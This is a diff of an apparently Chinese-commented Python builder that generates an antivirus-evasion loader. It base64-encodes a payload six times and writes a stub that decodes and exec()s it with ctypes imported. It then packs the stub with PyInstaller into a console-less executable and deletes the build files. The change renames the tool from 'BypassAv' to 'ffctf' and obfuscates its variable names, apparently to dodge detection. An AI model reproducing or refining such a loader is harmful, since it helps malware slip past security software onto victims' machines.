@@ -70,31 +70,33 @@ Code = str(base64.b64encode(body.encode('UTF-8')), 'UTF-8')
 for i in range(1,6):
     Code = str(base64.b64encode(Code.encode('UTF-8')), 'UTF-8')
 
-file = open('BypassAv.py', 'w',encoding="utf-8")
+file = open('ffctf.py', 'w',encoding="utf-8")
 
 
 file.write("""
+
 import base64
 import ctypes
 
-Code1=\""""'' +Code+ '' """\"
-for j in range(1,7):
-    Code1=base64.b64decode(Code1)
-exec(Code1)
+dasfgadgadfg=0
+fadsfasdfsadfg=\""""'' +Code+ '' """\"
+while dasfgadgadfg<6:
+    fadsfasdfsadfg=base64.b64decode(fadsfasdfsadfg)
+    dasfgadgadfg+=1
+exec(fadsfasdfsadfg)
 """)
 
 file.close()
 try:
     # 获取要打包的脚本路径
-    script_file = "BypassAv.py"
+    script_file = "ffctf.py"
     # 获取 PyInstaller 路径
     pyinstaller_path = os.path.dirname(PyInstaller.__main__.__file__)
     # 设置打包选项
     build_args = [
         "--onefile",  # 生成一个单独的可执行文件
         "--noconsole",  # 不显示命令行窗口
-        "--name=BypassAv",  # 设置生成的可执行文件名
-        "-i=i.ico",  # ico
+        "--name=ffctf",  # 设置生成的可执行文件名
         script_file  # 添加要打包的脚本路径
     ]
     # 执行打包命令
@@ -103,5 +105,5 @@ except:
     print("exe在dist文件夹内")
 # 删除 build 文件夹和.spec文件
 shutil.rmtree("./build")
-os.remove("./BypassAv.spec")
-os.remove("./BypassAv.py")
+os.remove("./ffctf.spec")
+os.remove("./ffctf.py")
